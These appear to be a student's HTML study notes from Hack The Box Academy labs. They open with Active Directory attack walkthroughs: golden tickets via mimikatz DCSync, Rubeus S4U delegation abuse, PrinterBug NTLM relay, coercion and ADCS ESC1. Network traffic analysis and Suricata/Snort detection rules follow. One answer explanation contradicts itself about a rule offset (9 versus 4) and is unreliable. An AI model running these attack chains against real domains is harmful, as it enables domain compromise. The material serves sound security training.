<p><code>/renewmax</code>: The maximum number of days the ticket can be renewed.</p>
<p><code>/endin</code>: End-of-life for the ticket.</p>
<p>First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync with Rocky's account from the previous attack to obtain the hash:</p>
<pre><code class="language-bash">runas /user:eagle\rocky cmd.exe
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt

Hash NTLM: db0d0630064747072a7da3f7c3b4069e
</code></pre>
<pre><code class="language-bash"># bob user
powershell -exec bypass
. .\PowerView.ps1
Get-DomainSID

S-1-5-21-1518138621-4282902758-752445584
</code></pre>
<pre><code class="language-bash"># rocky
# mimikatz
kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

exit

klist

dir \\dc1\c$
</code></pre>
<p><img alt="alt text" src="../assets/image13.png" /></p>
<p><img alt="alt text" src="../assets/image14.png" /></p>
<p><strong>Event ID 4675(S)</strong> SIDs were filtered. - Windows 10</p>
<h4 id="kerberos-constrained-delegation">Kerberos Constrained Delegation</h4>
<p>Kerberos Delegation enables an application to access resources hosted on a different server.</p>
<pre><code class="language-bash">powershell -ep bypass

Import-Module .\PowerView-main.ps1

Get-NetUser -TrustedToAuth

.\Rubeus.exe hash /password:Slavi123

# S4U (Service For User)
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:&quot;http/dc1&quot; /dc:dc1.eagle.local /ptt

klist 
# With the ticket being available, we can connect to the Domain Controller impersonating the account Administrator:
Enter-PSSession dc1

hostname
</code></pre>
<h4 id="print-spooler-ntlm-relaying">Print Spooler &amp; NTLM Relaying</h4>
<p>The <strong>Print Spooler</strong> is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, <em>Lee Christensen</em> found the <strong>PrinterBug</strong>. The functions <code>RpcRemoteFindFirstPrinterChangeNotification</code> and <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a TGT. Therefore, any domain user can coerce <code>RemoteServer$</code> to authenticate to any machine. Microsoft's stance on the <strong>PrinterBug</strong> was that it will not be fixed, as the issue is "by-design".</p>
<pre><code class="language-bash"># configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack
# connect to the Kali machine
$ xfreerdp /u:kali /p:kali /v:10.129.246.71 /dynamic-resolution

$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
$ python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:172.16.18.3 /dynamic-resolution
</code></pre>
<p><a href="https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py">dementor.py</a></p>
<p><strong>Prevention</strong></p>
<p>Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.</p>
<p>Additionally, there is an option to prevent the abuse of the PrinterBug while keeping the service running: when disabling the registry key <code>RegisterSpoolerRemoteRpcEndPoint</code>, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:</p>
<p><img alt="alt text" src="../assets/image15.png" /></p>
<p><strong>Q2:</strong></p>
<p><img alt="alt text" src="../assets/image16.png" /></p>
<h4 id="coercing-attacks-unconstrained-delegation">Coercing Attacks &amp; Unconstrained Delegation</h4>
<pre><code class="language-bash"># powerview
Get-NetComputer -Unconstrained | select samaccountname

#start Rubeus in an administrative prompt to monitor for new logons and extract TGTs
.\Rubeus.exe monitor /interval:1

# switch to the Kali machine to execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful
$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...

.\mimikatz.exe &quot;lsadump::dcsync /domain:eagle.local /user:Administrator&quot;
</code></pre>
<h4 id="object-acls">Object ACLs</h4>
<pre><code class="language-bash">.\SharpHound.exe -c All
</code></pre>
<p><strong>Event ID 4738(S)</strong> A user account was changed. - Windows 10</p>
<p><strong>Event ID 4724</strong> indicates an attempt to reset another account's password</p>
<p><strong>Event ID 4742(S)</strong> A computer account was changed. - Windows 10</p>
<h4 id="pki-esc1">PKI - ESC1</h4>
<pre><code class="language-bash">.\Certify.exe find /vulnerable

.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

# avoid bad formatting of the PEM file
$ sed -i 's/\s\s\+/\n/g' cert.pem

$ openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx

.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
</code></pre>
<h2 id="intro-to-network-traffic-analysis">Intro to Network Traffic Analysis</h2>
<p><strong>OSI / TCP-IP Models</strong></p>
<p>Protocol Data Units (PDU)</p>
<p><img alt="alt text" src="../assets/image17.png" /></p>
<p><strong>PDU Packet Breakdown</strong></p>
<p><img alt="alt text" src="../assets/image18.png" /></p>
<h4 id="tcpdump-fundamentals">Tcpdump Fundamentals</h4>
<table>
<thead>
<tr>
<th style="text-align: center;">Switch Command</th>
<th style="text-align: left;">Result</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">D</td>
<td style="text-align: left;">Will display any interfaces available to capture from.</td>
</tr>
<tr>
<td style="text-align: center;">i</td>
<td style="text-align: left;">Selects an interface to capture from. ex. -i eth0</td>
</tr>
<tr>
<td style="text-align: center;">n</td>
<td style="text-align: left;">Do not resolve hostnames.</td>
</tr>
<tr>
<td style="text-align: center;">nn</td>
<td style="text-align: left;">Do not resolve hostnames or well-known ports.</td>
</tr>
<tr>
<td style="text-align: center;">e</td>
<td style="text-align: left;">Will grab the ethernet header along with upper-layer data.</td>
</tr>
<tr>
<td style="text-align: center;">X</td>
<td style="text-align: left;">Show Contents of packets in hex and ASCII.</td>
</tr>
<tr>
<td style="text-align: center;">XX</td>
<td style="text-align: left;">Same as X, but will also specify ethernet headers. (like using Xe)</td>
</tr>
<tr>
<td style="text-align: center;">v, vv, vvv</td>
<td style="text-align: left;">Increase the verbosity of output shown and saved.</td>
</tr>
<tr>
<td style="text-align: center;">c</td>
<td style="text-align: left;">Grab a specific number of packets, then quit the program.</td>
</tr>
<tr>
<td style="text-align: center;">s</td>
<td style="text-align: left;">Defines how much of a packet to grab.</td>
</tr>
<tr>
<td style="text-align: center;">S</td>
<td style="text-align: left;">change relative sequence numbers in the capture display to absolute sequence numbers. (13248765839 instead of 101)</td>
</tr>
<tr>
<td style="text-align: center;">q</td>
<td style="text-align: left;">Print less protocol information.</td>
</tr>
<tr>
<td style="text-align: center;">r file.pcap</td>
<td style="text-align: left;">Read from a file.</td>
</tr>
<tr>
<td style="text-align: center;">w file.pcap</td>
<td style="text-align: left;">Write into a file.</td>
</tr>
</tbody>
</table>
<pre><code class="language-bash"># Listing Available Interfaces
$ sudo tcpdump -D

# Choosing an Interface to Capture From
$ sudo tcpdump -i eth0

# Disable Name Resolution
$ sudo tcpdump -i eth0 -nn

# Display the Ethernet Header
$ sudo tcpdump -i eth0 -e

# Include ASCII and Hex Output
$ sudo tcpdump -i eth0 -X

# Tcpdump Switch Combinations
$ sudo tcpdump -i eth0 -nnvXX

# Save our PCAP Output to a File
$ sudo tcpdump -i eth0 -w ~/output.pcap

# Reading Output From a File
$ sudo tcpdump -r ~/output.pcap
</code></pre>
<h4 id="tcpdump-packet-filtering">Tcpdump Packet Filtering</h4>
<table>
<thead>
<tr>
<th style="text-align: center;">Filter</th>
<th style="text-align: left;">Result</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">host</td>
<td style="text-align: left;">host will filter visible traffic to show anything involving the designated host. Bi-directional</td>
</tr>
<tr>
<td style="text-align: center;">src / dest</td>
<td style="text-align: left;">src and dest are modifiers. We can use them to designate a source or destination host or port.</td>
</tr>
<tr>
<td style="text-align: center;">net</td>
<td style="text-align: left;">net will show us any traffic sourcing from or destined to the network designated. It uses / notation.</td>
</tr>
<tr>
<td style="text-align: center;">proto</td>
<td style="text-align: left;">will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples)</td>
</tr>
<tr>
<td style="text-align: center;">port</td>
<td style="text-align: left;">port is bi-directional. It will show any traffic with the specified port as the source or destination.</td>
</tr>
<tr>
<td style="text-align: center;">portrange</td>
<td style="text-align: left;">portrange allows us to specify a range of ports. (0-1024)</td>
</tr>
<tr>
<td style="text-align: center;">less / greater "&lt; &gt;"</td>
<td style="text-align: left;">less and greater can be used to look for a packet or protocol option of a specific size.</td>
</tr>
<tr>
<td style="text-align: center;">and / &amp;&amp;</td>
<td style="text-align: left;">and &amp;&amp; can be used to concatenate two different filters together. for example, src host AND port.</td>
</tr>
<tr>
<td style="text-align: center;">or</td>
<td style="text-align: left;">or allows for a match on either of two conditions. It does not have to meet both. It can be tricky.</td>
</tr>
<tr>
<td style="text-align: center;">not</td>
<td style="text-align: left;">not is a modifier saying anything but x. For example, not UDP.</td>
</tr>
</tbody>
</table>
<pre><code class="language-bash"># Host Filter
$ sudo tcpdump -i eth0 host 172.16.146.2

# Source/Destination Filter
$ sudo tcpdump -i eth0 src host 172.16.146.2

# Utilizing Source With Port as a Filter
$ sudo tcpdump -i eth0 tcp src port 80

# Using Destination in Combination with the Net Filter
$ sudo tcpdump -i eth0 dest net 172.16.146.0/24

# Protocol Filter - Common Name
$ sudo tcpdump -i eth0 udp

# Protocol Filter - Number
# Protocol 17 is the User Datagram Protocol (UDP). 
$ sudo tcpdump -i eth0 proto 17

# Port Filter
$ sudo tcpdump -i eth0 tcp port 443

# Port Range Filter
$ sudo tcpdump -i eth0 portrange 0-1024

# Less/Greater Filter
$ sudo tcpdump -i eth0 less 64

# Utilizing Greater
$ sudo tcpdump -i eth0 greater 500

# AND Filter
$ sudo tcpdump -i eth0 host 192.168.0.1 and port 23

# OR Filter
$ sudo tcpdump -r sus.pcap icmp or host 172.16.146.1

# NOT Filter
$ sudo tcpdump -r sus.pcap not icmp
</code></pre>
<p><strong>Tips and Tricks</strong></p>
<pre><code class="language-bash"># -A will show only the ASCII text
$ sudo tcpdump -Ar telnet.pcap

# Piping a Capture to Grep
# used the -l to pass the output to grep
$ sudo tcpdump -Ar http.cap -l | grep 'mailto:*'

# Looking for TCP Protocol Flags
$ tcpdump -i eth0 'tcp[13] &amp;2 != 0'

# Hunting For a SYN Flag
$ sudo tcpdump -i eth0 'tcp[13] &amp;2 != 0'
</code></pre>
<h4 id="wireshark">Wireshark</h4>
<pre><code class="language-bash"># filter commands
ftp
ftp.request.command

# ftp-data - Will show any data transferred over the data channel ( port 20 )
ftp-data
</code></pre>
<h2 id="intermediate-network-traffic-analysis">Intermediate Network Traffic Analysis</h2>
<pre><code class="language-bash">$ wget -O file.zip 'https://academy.hackthebox.com/storage/resources/pcap_files.zip' &amp;&amp; mkdir tempdir &amp;&amp; unzip file.zip -d tempdir &amp;&amp; mkdir -p pcaps &amp;&amp; mv tempdir/Intermediate_Network_Traffic_Analysis/* pcaps/ &amp;&amp; rm -r tempdir file.zip
</code></pre>
<h4 id="arp-spoofing-abnormality-detection">ARP Spoofing &amp; Abnormality Detection</h4>
<p>Address Resolution Protocol (ARP)</p>
<p><strong>arp.opcode == 1:</strong> This represents all types of ARP Requests</p>
<p><strong>arp.opcode == 2:</strong> This signifies all types of ARP Replies</p>
<p><code>arp.duplicate-address-detected &amp;&amp; arp.opcode == 2</code></p>
<p><code>arp.duplicate-address-detected or arp.duplicate-address-frame</code></p>
<p><code>(arp.opcode) &amp;&amp; ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))</code></p>
<p><code>arp.opcode==1 &amp;&amp; eth.src==08:00:27:53:0c:ba</code></p>
<h4 id="arp-scanning-denial-of-service">ARP Scanning &amp; Denial-of-Service</h4>
<p>Some typical <strong>red flags</strong> indicative of ARP scanning are:</p>
<ol>
<li>
<p>Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)</p>
</li>
<li>
<p>Broadcast ARP requests sent to non-existent hosts</p>
</li>
<li>
<p>Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host</p>
</li>
</ol>
<h4 id="80211-denial-of-service">802.11 Denial of Service</h4>
<p><strong>Wireless Interfaces</strong></p>
<p><code>iwconfig</code></p>
<p><strong>Airmon-NG</strong></p>
<p><code>sudo airmon-ng start wlan0</code></p>
<p><strong>Monitor Mode</strong></p>
<pre><code class="language-bash">$ sudo ifconfig wlan0 down
$ sudo iwconfig wlan0 mode monitor
$ sudo ifconfig wlan0 up
$ iwconfig
</code></pre>
<p>To commence capturing traffic from our clients and network, we can employ airodump-ng. We need to specify our AP's channel with -c, its BSSID with --bssid, and the output file name with -w.</p>
<p><code>$ sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw</code></p>
<p><strong>How Deauthentication Attacks Work</strong></p>
<ol>
<li>
<p>To capture the WPA handshake to perform an offline dictionary attack</p>
</li>
<li>
<p>To cause general denial of service conditions</p>
</li>
<li>
<p>To enforce users to disconnect from our network, and potentially join their network to retrieve information</p>
</li>
</ol>
<p><strong>Finding Deauthentication Attacks</strong></p>
<p><code>wlan.bssid == xx:xx:xx:xx:xx:xx</code></p>
<p>specify the type of frame (management) with 00 and the subtype (deauthentication) with 12</p>
<p><code>(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)</code></p>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)</code></p>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)</code></p>
<p><strong>Q:</strong>
Inspect the deauthandbadauth.cap file, part of this module's resources, and submit the total count of deauthentication frames as your answer.</p>
<p><code>wlan.bssid == F8:14:FE:4D:E6:F1 and wlan.fc.type_subtype == 12</code></p>
<h4 id="rogue-access-point-evil-twin-attacks">Rogue Access Point &amp; Evil-Twin Attacks</h4>
<p><strong>Airodump-ng Detection</strong></p>
<p><code>$ sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw</code></p>
<p><code>(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)</code></p>
<p><strong>Finding a Fallen User</strong></p>
<p><code>(wlan.bssid == F8:14:FE:4D:E6:F2)</code></p>
<p><strong>Q:</strong></p>
<p><img alt="alt text" src="../assets/image19.png" /></p>
<h4 id="fragmentation-attacks">Fragmentation Attacks</h4>
<p><strong>Q:</strong> Inspect the nmap_frag_fw_bypass.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP RST flag set as your answer.</p>
<p><code>tcp.flags.reset==1</code></p>
<h4 id="tcp-handshake-abnormalities">TCP Handshake Abnormalities</h4>
<p><strong>Q:</strong> Inspect the nmap_syn_scan.pcapng file, part of this module's resources, and enter the total count of packets that have the TCP ACK flag set as your answer.</p>
<p><code>tcp.flags.ack==1</code></p>
<h4 id="httphttps-service-enumeration">HTTP/HTTPs Service Enumeration</h4>
<pre><code class="language-bash">$ cat access.log | grep &quot;192.168.10.5&quot;

$ cat access.log | awk '$1 == &quot;192.168.10.5&quot;'
</code></pre>
<pre><code>http.request and ((ip.src_host == &lt;suspected IP&gt;) or (ip.dst_host == &lt;suspected IP&gt;))
</code></pre>
<p><strong>Q:</strong> Inspect the basic_fuzzing.pcapng file, part of this module's resources, and enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.</p>
<p><code>http.request.method==GET &amp;&amp; tcp.dstport == 80</code></p>
<h4 id="strange-http-headers">Strange HTTP Headers</h4>
<pre><code class="language-bash">http.request and (!(http.host == &quot;192.168.10.7&quot;))

http.response.code == 400
</code></pre>
<h4 id="ssl-renegotiation-attacks">SSL Renegotiation Attacks</h4>
<pre><code class="language-bash"># The content type 22 specifies handshake messages only
ssl.record.content_type == 22
</code></pre>
<p><strong>Q:</strong> Inspect the SSL_renegotiation_edited.pcapng file, part of this module's resources, and enter the total count of "Client Hello" requests as your answer.</p>
<p><code>tls.handshake.type == 1</code></p>
<h4 id="strange-telnet-udp-connections">Strange Telnet &amp; UDP Connections</h4>
<pre><code class="language-bash">((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
</code></pre>
<h2 id="working-with-idsips">Working with IDS/IPS</h2>
<h4 id="suricata">Suricata</h4>
<p><strong>Suricata Operation Modes</strong></p>
<ol>
<li>
<p>The Intrusion Detection System (IDS) mode positions Suricata as a silent observer. </p>
</li>
<li>
<p>In the Intrusion Prevention System (IPS) mode, Suricata adopts a proactive stance. </p>
</li>
<li>
<p>The Intrusion Detection Prevention System (IDPS) mode brings together the best of both IDS and IPS. </p>
</li>
<li>
<p>In its Network Security Monitoring (NSM) mode, Suricata transitions into a dedicated logging mechanism, eschewing active or passive traffic analysis or prevention capabilities. </p>
</li>
</ol>
<p><strong>Configuring Suricata &amp; Custom Rules</strong></p>
<pre><code class="language-bash">$ ls -lah /etc/suricata/rules/

$ more /etc/suricata/rules/emerging-malware.rules

$ more /etc/suricata/suricata.yaml

$ sudo vim /etc/suricata/suricata.yaml

$ suricata -r /home/htb-student/pcaps/suspicious.pcap

# bypass checksums (-k flag) and log in a different directory (-l flag)
$ suricata -r /home/htb-student/pcaps/suspicious.pcap -k none -l .

# For live input, we can try Suricata’s (Live) LibPCAP mode as follows
$ ifconfig

# ens160 is an interface number like eth0
$ sudo suricata --pcap=ens160 -vv

# For Suricata in Inline (NFQ) mode, the following command should be executed first.
$ sudo iptables -I FORWARD -j NFQUEUE

$ sudo suricata -q 0

# try Suricata in IDS mode with AF_PACKET input, execute one of the below.
$ sudo suricata -i ens160
$ sudo suricata --af-packet=ens160

# utilize tcpreplay to replay network traffic from a PCAP file (suspicious.pcap in this case)
$ sudo  tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
</code></pre>
<p><strong>Suricata Outputs</strong></p>
<pre><code class="language-bash">$ less /var/log/suricata/old_eve.json

$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == &quot;alert&quot;)'

$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == &quot;dns&quot;)' | head -1 | jq .

$ cat /var/log/suricata/old_fast.log

$ cat /var/log/suricata/old_stats.log
</code></pre>
<p><strong>File Extraction</strong></p>
<pre><code class="language-bash"># rules
alert http any any -&gt; any any (msg:&quot;FILE store all&quot;; filestore; sid:2; rev:1;)
</code></pre>
<p><strong>Live Rule Reloading Feature &amp; Updating Suricata Rulesets</strong></p>
<pre><code class="language-bash">$ sudo kill -usr2 $(pidof suricata)

$ sudo suricata-update

$ sudo suricata-update list-sources

$ sudo suricata-update enable-source et/open

$ sudo suricata-update

$ sudo systemctl restart suricata
</code></pre>
<p><strong>Validating Suricata's Configuration</strong></p>
<pre><code class="language-bash">$ sudo suricata -T -c /etc/suricata/suricata.yaml
</code></pre>
<p><strong>Q1:</strong> Filter out only HTTP events from /var/log/suricata/old_eve.json using the the jq command-line JSON processor. Enter the flow_id that you will come across as your answer.</p>
<p><code>$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == "http")'</code></p>
<p><strong>Q2:</strong> Enable the http-log output in suricata.yaml and run Suricata against /home/htb-student/pcaps/suspicious.pcap. Enter the requested PHP page as your answer. Answer format: _.php</p>
<pre><code class="language-bash">$ sudo vim /etc/suricata/suricata.yaml

/http-log
enable: yes
:wq

$ suricata -r /home/htb-student/pcaps/suspicious.pcap -k none -l .

$ cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == &quot;http&quot;)' | tail -1 | jq .

# OR
$ find /var/log/suricata -type f -exec cat {} \; | grep -arin -o -E '(\w+\W+){0,5}php(\W+\w+){0,5}' .
</code></pre>
<p>app.php</p>
<h4 id="suricata-rule-development-part-1">Suricata Rule Development Part 1</h4>
<p><code>action protocol from_ip port -&gt; to_ip port (msg:"Known malicious behavior, possible X malware infection"; content:"some thing"; content:"some other thing"; sid:10000001; rev:1;)</code></p>
<p>Example: <code>alert http any any -&gt; $HOME_NET any (msg: "ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection"; content: "POST"; http_method; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; http_uri; content: "installation.varValue="; nocase; http_client_body; pcre: !"/^\$?[\sa-z\\_0-9.-]*(\&amp;|$)/iRP"; flow: to_server, established;sid: 10000048; rev: 1;)</code></p>
<pre><code class="language-bash">$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.173.128 /dynamic-resolution /relax-order-checks +glyph-cache
`
# Suricata Rule Development Example 1: Detecting PowerShell Empire
alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;ET MALWARE Possible PowerShell Empire Activity Outbound&quot;; flow:established,to_server; content:&quot;GET&quot;; http_method; content:&quot;/&quot;; http_uri; depth:1; pcre:&quot;/^(?:login\/process|admin\/get|news)\.php$/RU&quot;; content:&quot;session=&quot;; http_cookie; pcre:&quot;/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi&quot;; content:&quot;Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1&quot;; http_user_agent; http_start; content:&quot;.php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session=&quot;; fast_pattern; http_header_names; content:!&quot;Referer&quot;; content:!&quot;Cache&quot;; content:!&quot;Accept&quot;; sid:2027512; rev:1;)

$ sudo suricata -r /home/htb-student/pcaps/psempire.pcap -l . -k none
$ cat fast.log

# Suricata Rule Development Example 2: Detecting Covenant
alert tcp any any -&gt; $HOME_NET any (msg:&quot;detected by body&quot;; content:&quot;&lt;title&gt;Hello World!&lt;/title&gt;&quot;; detection_filter: track by_src, count 4 , seconds 10; priority:1; sid:3000011;)

$ sudo suricata -r /home/htb-student/pcaps/covenant.pcap -l . -k none
$ cat fast.log

# Suricata Rule Development Example 3: Detecting Covenant (Using Analytics)
alert tcp $HOME_NET any -&gt; any any (msg:&quot;detected by size and counter&quot;; dsize:312; detection_filter: track by_src, count 3 , seconds 10; priority:1; sid:3000001;)

$ sudo suricata -r /home/htb-student/pcaps/covenant.pcap -l . -k none
$ cat fast.log

# Suricata Rule Development Example 4: Detecting Sliver
alert tcp any any -&gt; any any (msg:&quot;Sliver C2 Implant Detected&quot;; content:&quot;POST&quot;; pcre:&quot;/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z_]{1,2}=[a-z0-9]{1,10}/i&quot;; sid:1000007; rev:1;)

$ sudo suricata -r /home/htb-student/pcaps/sliver.pcap -l . -k none
$ cat fast.log

alert tcp any any -&gt; any any (msg:&quot;Sliver C2 Implant Detected - Cookie&quot;; content:&quot;Set-Cookie&quot;; pcre:&quot;/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]{32}\;/&quot;; sid:1000003; rev:1;)
</code></pre>
<p><strong>Q:</strong> In the /home/htb-student directory of this section's target, there is a file called local.rules. Within this file, there is a rule with sid 2024217, which is associated with the MS17-010 exploit. Additionally, there is a PCAP file named eternalblue.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to MS17-010. What is the minimum offset value that can be set to trigger an alert?</p>
<p>The minimum offset value that can be set to trigger an alert in the Suricata rule provided is 4. Here’s an explanation of why:</p>
<p>In Suricata rules, the offset keyword specifies the byte offset within the packet payload where the search for the specified content begins.</p>
<p>Let’s break down the relevant part of the rule:</p>
<pre><code class="language-bash">content:&quot;|ff|SMB|33 00 00 00 00 18 07 c0 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|&quot;;
offset:9;
</code></pre>
<p><code>content:"|ff|SMB|33 00 00 00 00 18 07 c0 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|";</code> specifies the hex bytes of the pattern to match in the payload.</p>
<p><code>offset:9;</code> means that the search for this pattern starts at byte offset 9 within the payload.</p>
<p>The reason the minimum offset value that can trigger the alert is 4 lies in the details of how the rule is constructed:</p>
<p>The <code>content</code> part is a hexadecimal string representing a specific pattern related to the MS17-010 exploit.</p>
<p>The <code>offset</code> value of 9 means that the matching starts 9 bytes into the payload.</p>
<p>However, the <code>content</code> to match starts with the byte <code>ff</code>.</p>
<p>If the <code>offset</code> value were set to 8 or lower, it would not find the <code>ff</code> byte at the correct position to match the pattern specified in the rule. </p>
<p>Therefore, the minimum <code>offset</code> that correctly aligns with the beginning of the pattern in the payload is 9.</p>
<p>To clarify further:</p>
<p>Offset 8 would start just before the <code>ff</code> byte, which is not the start of the pattern.</p>
<p>Offset 9 starts at the <code>ff</code> byte, which is correct for the pattern matching to work.</p>
<p>Thus, the correct minimum <code>offset</code> value that allows the rule to correctly detect the pattern associated with the MS17–010 exploit is 4.</p>
<pre><code class="language-bash"># enable the rule of externalblue
$ vim local.rules

# Add /home/htb-student/local.rules to rule-files
$ sudo vim /etc/suricata/suricata.yaml

$ sudo suricata -r /home/htb-student/pcaps/eternalblue.pcap -l . -k none
$ cat fast.log
# when change the offset value to 4, the fast.log starts having content
</code></pre>
<p><img alt="alt text" src="../assets/image20.png" /></p>
<pre><code class="language-bash"># Suricata Rule Development Example 5: Detecting Dridex (TLS Encrypted)
alert tls $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&quot;ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)&quot;; flow:established,from_server; content:&quot;|16|&quot;; content:&quot;|0b|&quot;; within:8; byte_test:3,&lt;,1200,0,relative; content:&quot;|03 02 01 02 02 09 00|&quot;; fast_pattern; content:&quot;|30 09 06 03 55 04 06 13 02|&quot;; distance:0; pcre:&quot;/^[A-Z]{2}/R&quot;; content:&quot;|55 04 07|&quot;; distance:0; content:&quot;|55 04 0a|&quot;; distance:0; pcre:&quot;/^.{2}[A-Z][a-z]{3,}\s(?:[A-Z][a-z]{3,}\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\.[A-Za-z]){1,3})\.?[01]/Rs&quot;; content:&quot;|55 04 03|&quot;; distance:0; byte_test:1,&gt;,13,1,relative; content:!&quot;www.&quot;; distance:2; within:4; pcre:&quot;/^.{2}(?P&lt;CN&gt;(?:(?:\d?[A-Z]?|[A-Z]?\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})\.){0,2}?(?:\d?[A-Z]?|[A-Z]?\d?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?\.(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs&quot;; content:!&quot;|2a 86 48 86 f7 0d 01 09 01|&quot;; content:!&quot;GoDaddy&quot;; sid:2023476; rev:5;)

# Suricata Rule Development Example 6: Detecting Sliver (TLS Encrypted)
alert tls any any -&gt; any any (msg:&quot;Sliver C2 SSL&quot;; ja3.hash; content:&quot;473cd7cb9faa642487833865d516e578&quot;; sid:1002; rev:1;)

$ ja3 -a --json /home/htb-student/pcaps/sliverenc.pcap
$ sudo suricata -r /home/htb-student/pcaps/sliverenc.pcap -l . -k none
$ cat fast.log
</code></pre>
<p><strong>Q:</strong> There is a file named trickbot.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to a certain variation of the Trickbot malware. Enter the precise string that should be specified in the content keyword of the rule with sid 100299 within the local.rules file so that an alert is triggered as your answer.</p>
<pre><code class="language-bash">$ ja3 -a --json /home/htb-student/pcaps/trickbot.pcap
$ vim local.rules
alert tls any any -&gt; any any (msg:&quot;Trickbot C2 SSL&quot;; ja3.hash; content:&quot;72a589da586844d7f0818ce684948eea&quot;; sid:100299; rev:1;)

$ sudo suricata -r /home/htb-student/pcaps/trickbot.pcap -l . -k none
$ cat fast.log
</code></pre>
<h4 id="snort">Snort</h4>
<p>Reading from a pcap file with the <code>-r</code> option or listening on an interface with <code>-i</code> will cause Snort to run in <em>passive</em> mode by default. If the DAQ supports inline, however, then users can specify the <code>-Q</code> flag to run Snort inline.</p>
<p>Default configuration files, namely <code>snort.lua</code> and <code>snort_defaults.lua</code></p>
<pre><code class="language-bash">$ sudo more /root/snorty/etc/snort/snort.lua

$ snort --help-modules

$ snort --help-config arp_spoof

# Passing (and validating) configuration files to Snort 
$ snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq

</code></pre>
<p>DAQ: Data Acquisition Library</p>
<p><strong>Snort Inputs</strong></p>
<pre><code class="language-bash">$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i ens160
</code></pre>
<p><strong>Snort Rules</strong></p>
<pre><code class="language-bash">$ sudo vim /root/snorty/etc/snort/snort.lua
</code></pre>
<p><strong>Snort Outputs</strong></p>
